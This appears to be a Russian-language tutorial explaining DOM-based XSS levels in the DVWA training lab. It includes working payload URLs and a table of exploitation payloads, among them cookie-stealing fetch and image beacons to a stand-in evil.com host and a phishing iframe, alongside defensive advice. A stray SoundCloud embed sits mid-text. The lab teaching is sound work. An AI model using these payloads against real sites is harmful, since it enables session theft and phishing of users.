**DOM-based XSS**. Это одна из самых **скрытных и опасных** форм XSS, и сейчас объясню всё по полочкам — как это работает, что ты сделал, и какие возможны улучшения атаки.

---

# 📘 Анализ DOM-based XSS в DVWA

---

## 💡 Что такое DOM-based XSS?

**DOM-based XSS** — это уязвимость, при которой вредоносный код исполняется **на стороне клиента (в браузере)**, а не через ответ сервера.
То есть:

* Сервер не видит вредоносный код.
* Уязвимость возникает в **JavaScript-коде на странице**, который **обрабатывает данные из URL** (например, `location.hash`, `location.search`, `document.URL`, `document.referrer`) и **вставляет их в DOM без проверки**.

---

## 🧪 Уровень Low

🔗 **URL**:

```
http://localhost:8081/vulnerabilities/xss_d/?default=<script>alert(1)</script>
```

### 🔍 Что происходит?

1. JavaScript получает `default` из `location.search`:

   ```js
   var defaultLang = document.URL.split('default=')[1];
   document.getElementById("languageSelect").innerHTML = defaultLang;
   ```
2. Это вставляется в `innerHTML`, без какой-либо фильтрации.

➡️ Поэтому `<script>alert(1)</script>` **выполняется**.
- <iframe src="javascript:alert(`xss`)">
---

## 🧪 Уровень Medium

🔗 **URL**:

```
http://localhost:8081/vulnerabilities/xss_d/?default=</option></select><img src=123.png onerror="alert(document.cookie)">
```

### 🔍 Что происходит?

1. JavaScript снова вставляет значение параметра `default` в DOM (внутрь `<select>`).
2. Мы закрываем `<option>` и `<select>`, а затем **вставляем `img` с onerror\`** — хитрый обход фильтра.

### 🧠 Почему работает?

* Браузер **парсит HTML**, и создаёт DOM-элементы.
* Так как это `innerHTML`, всё внутри парсится как HTML — включая закрытие тегов и создание новых элементов.
* Мы фактически "вышли" из `<select>`, и добавили свой `<img>` с вредоносным JavaScript.

---

## 🧪 Уровень High

🔗 **URL**:

```
http://localhost:8081/vulnerabilities/xss_d/?default=English#<script>alert(document.cookie);</script>
```

### 🔍 Что происходит?

1. В коде `default` теперь читается не из `location.search`, а из **`location.hash`** (`#...`).
2. То есть JavaScript, например, делает:

   ```js
   var lang = location.hash;
   document.getElementById("output").innerHTML = lang;
   ```
3. И снова вставляет `innerHTML` — без проверки.

➡️ Поэтому `<script>alert(document.cookie);</script>` срабатывает при **обновлении страницы**.
- <iframe src="javascript:alert(document.cookie)">
- <iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true"></iframe>
---

## 📌 Почему DOM XSS опасен?

| Фактор                               | Почему                                                                     |
| ------------------------------------ | -------------------------------------------------------------------------- |
| Не видно на сервере                  | Сервер не получает вредоносный скрипт                                      |
| Антивирус не ловит                   | Он в `#fragment` — браузер туда не заглядывает, если специально не сказать |
| Может применяться в SPA              | Особенно актуально в Single Page Applications                              |
| Можно подменять DOM без перезагрузки | Очень гибкий инструмент для атак                                           |

---

## 🎯 Как можно эксплуатировать?

| Цель               | Пример                                                                   | Что произойдёт                 |
| ------------------ | ------------------------------------------------------------------------ | ------------------------------ |
| Похищение куки     | `#<script>fetch('https://evil.com?c='+document.cookie)</script>`         | Отправит сессию злоумышленнику |
| Подмена DOM        | `#<h1>You got hacked</h1>`                                               | Вставка кастомного HTML        |
| Фишинг прямо в SPA | `#<iframe src="https://fake-login.com"></iframe>`                        | Маскировка под страницу входа  |
| Silent Payload     | `#<img src=x onerror="new Image().src='//evil.com/c='+document.cookie">` | Тихая отправка данных          |

---

## 🛡️ Как защищаться от DOM XSS?

* Никогда не использовать `innerHTML`, если можно обойтись `textContent` или `innerText`.
* Не вставлять данные из `location.*` напрямую в DOM.
* Применять CSP (Content Security Policy), особенно блокировку `unsafe-inline`.
* Использовать **DOMPurify** для очистки пользовательских данных.
* Убедиться, что фреймворки (React, Vue, Angular) не допускают raw вставки HTML без явного разрешения (`dangerouslySetInnerHTML` и аналоги).

---

## 🧰 Дополнение — шпаргалка DOM-XSS источников и sinks

| Источники (`sources`) | Потенциально опасные значения |
| --------------------- | ----------------------------- |
| `location.search`     | everything after `?`          |
| `location.hash`       | everything after `#`          |
| `document.referrer`   | откуда перешли                |
| `document.URL`        | весь URL                      |

| Места вставки (`sinks`)          | Угроза                 |
| -------------------------------- | ---------------------- |
| `innerHTML`                      | интерпретирует HTML/JS |
| `document.write`                 | исполняет сразу        |
| `eval()`                         | исполняет как код      |
| `setTimeout("...")`              | если строка            |
| `setAttribute("onclick", "...")` | внедряет обработчики   |

---

Следует подготовить:

✅ Таблицу атак для DOM-XSS
✅ Сценарии эксплуатации в современных SPA
✅ Шаблоны фильтрации и безопасного взаимодействия с DOM

